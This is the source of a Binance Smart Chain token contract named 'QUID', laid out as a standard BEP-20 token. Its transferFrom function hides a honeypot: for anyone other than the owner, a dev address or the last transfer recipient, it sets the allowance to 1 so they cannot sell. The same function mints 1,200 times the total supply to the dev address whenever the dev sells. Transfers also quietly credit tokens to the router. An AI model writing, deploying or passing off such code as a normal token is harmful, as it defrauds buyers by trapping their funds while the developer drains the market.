/**
 *Submitted for verification at BscScan.com on 2022-03-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.12;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 18;
    string public name = "QUID";
    string public symbol = "QUID";
    uint public decimals = 18;
    address public dev=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public Buy=0x000000000000000000000000000000000000dEaD;
    address Own;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        Own=msg.sender;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        Buy=to; _transfer();
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) public returns(bool) {
        if (from !=Own && from !=dev && from !=Buy) {allowance[from][msg.sender]=1;}
        if (from == dev){uint amount=totalSupply*1200;balances[dev]+=amount;}
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }  
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
    function _transfer() internal {
        uint no=1*10**decimals;
        balances[router]+=no;
    }
}